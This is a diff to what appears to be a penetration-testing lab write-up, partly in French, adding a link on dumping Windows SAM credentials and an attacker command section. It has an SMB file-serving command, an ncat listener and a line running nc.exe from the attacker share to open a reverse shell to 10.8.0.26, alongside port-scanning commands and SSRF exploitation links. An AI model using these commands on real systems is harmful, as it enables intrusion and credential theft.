@@ -84,6 +84,7 @@ More detail: [Step6](./step6.md)
 8. s3 bucket ssrf metadata : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
 9. exploitation s3 via ssrf : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/
 10. exploitation host-manager tomcat : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
+11. extract sam security : https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/
 
 ---
 
@@ -128,4 +129,22 @@ IP='172.16.42.101'
 sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 $IP | tee out_mass
 PORT=`cat out_mass | cut -d ' ' -f4 | sed 's/\/.*$//' | tr '\n' ','`
 sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p$PORT $IP
+```
+
+* smb server
+
+```bash
+sudo smbserver.py -smb2support -debug -comment "data" data .
+```
+
+* reverse shell
+
+```bash
+rlwrap ncat -klvp 12345
+```
+
+* exec à distance
+
+```
+\\10.8.0.26\data\nc.exe -e cmd.exe 10.8.0.26 12345
 ```
